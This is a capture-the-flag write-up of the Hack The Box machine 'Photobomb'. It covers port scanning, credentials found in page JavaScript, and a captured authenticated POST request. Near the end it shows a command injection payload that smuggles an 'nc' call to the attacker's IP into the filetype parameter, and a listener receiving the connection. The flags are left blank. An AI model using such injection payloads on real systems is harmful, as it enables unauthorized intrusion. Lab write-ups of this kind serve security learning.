# [27 - Photobomb](https://app.hackthebox.com/machines/Photobomb)

![Photobomb.png](Photobomb.png)

## description
> 10.10.11.182

## walkthrough

### recon

```
$ nmap -sC -sV -A -Pn -p- photobomb.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2022-10-29 08:54 MDT
Nmap scan report for photobomb.htb (10.10.11.182)
Host is up (0.056s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Photobomb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

ok, pretty standard.

### 80

> Welcome to your new Photobomb franshise!
> You will soon be making an amazing income selling premium photographic gifts.

> This state of-the-art web application is your gateway to this fantastic new life. Your wish is its command.

> To get started, please click here! (the credentials are in your welcome pack).

> If you have any problems with your printer, please call our Technical Support team on 4 4283 77468377.

[here](http://photobomb.htb/printer) is a link

and `photobomb.js` has the content
```
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

ok, some creds - which get us to a gallery of some sort, allowing us to specify file type and size, and a link to download

which is actually a POST
```
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 78
Origin: http://photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1

photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=png&dimensions=1000x1500
```

piping that through sqlmap, nothing popping.

gobuster
```
/favicon.ico          (Status: 200) [Size: 10990]
/printers             (Status: 401) [Size: 188]
/printer              (Status: 401) [Size: 188]
```

interesting, `printers` gives us

```
Sinatra doesn’t know this ditty.
Try this:

get '/printers' do
  "Hello World"
end
```

ohai ruby

```
Bad Request
bad URI `/]'.
WEBrick/1.6.0 (Ruby/2.7.0/2019-12-25) at photobomb:4567
```

wait webrick and sinatra?

POSTing `photo=../../../../../etc/passwd` gives `Invalid photo`

trying SSTI in file and dimensions lead to "Invalid <type>"

`http://photobomb.htb/ui_images/wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg` gives the thumbnail image

wrote [foo.rb](foo.rb) to pull all the thumbnails while waiting for gobuster to finish scanning that dir for anything else

```
$ find . -iname '*.jpg' -exec stegseek {} \;           
...
```
nothing useful. same with strings


trying more injection in parameters we do control

```
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=png;nc%2010.10.14.5 4444&dimensions=30x20
```

led to

```
$ nc -lv 4444
Listening on 0.0.0.0 4444
Connection received on photobomb.htb 41866
```

boom baby. 



## flag
```
user:
root:
```
